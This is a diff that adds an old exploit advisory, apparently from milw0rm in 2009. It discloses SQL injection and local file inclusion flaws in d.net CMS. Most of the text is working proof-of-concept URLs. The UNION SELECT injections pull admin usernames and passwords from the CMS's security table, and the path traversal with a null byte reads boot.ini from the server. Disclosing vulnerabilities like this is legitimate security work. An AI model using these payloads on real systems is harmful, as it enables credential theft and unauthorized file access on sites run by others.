@@ -1,0 +1,37 @@
+###############################################################################################################################################
+[+] d.net CMS (LFI/SQLI) Multiple Remote Vulnerabilities
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+###############################################################################################################################################
+
+[+] Download : http://sourceforge.net/projects/dnet/
+
+[+] SQL Injection
+
+ PoC's
+
+ - No admin required
+
+    http://127.0.0.1/path/index.php?page=null+union+all+select+1,concat_ws(0x3a,username,password),3,4,5,
+6,7+from+cms_security_master+where+id=1--
+
+ - Admin required
+
+    http://127.0.0.1/path/dnet_admin/index.php?edit_id=null+union+all+select+1,concat_ws(0x3a,username,password),3,4,5,
+6,7,8,9+from+cms_security_master+where+id=1--&_p=1&type=news
+
+    http://127.0.0.1/path/dnet_admin/index.php?edit_id=1&_p=null+union+all+select+1,2,concat_ws(0x3a,username,password),4,
+5,6,7+from+cms_security_master+where+id=1--&type=news
+
+[+] Local File Inclusion
+
+ - PoC
+
+ - Admin required
+
+    http://127.0.0.1/path/dnet_admin/index.php?edit_id=2&_p=2&type=../../../../../../boot.ini%00
+
+###############################################################################################################################################
+
+# milw0rm.com [2009-07-30]
